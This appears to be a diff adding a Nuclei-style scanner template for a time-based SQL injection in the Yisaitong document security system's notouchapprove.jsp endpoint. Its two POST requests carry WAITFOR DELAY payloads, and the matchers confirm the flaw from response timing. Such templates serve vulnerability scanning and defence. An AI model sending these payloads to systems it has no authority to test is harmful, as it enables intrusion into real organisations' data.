@@ -1,0 +1,39 @@
+id: yisaitong-notouchapprove-sqli
+
+info:
+  name: 亿赛通电子文档安全管理系统 notouchapprove.jsp SQL注入漏洞
+  author: yisaitong
+  severity: high
+  tags: yisaitong
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1'WAITFOR DELAY'0%3a0%3a2'--
+
+      - |
+        POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1'WAITFOR DELAY'0%3a0%3a4'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - 'duration_1 >= 2'
+          - 'duration_1 < 4'
+          - 'duration_2 >= 4'
+          - 'duration_2 < 6'
+        condition: and
+
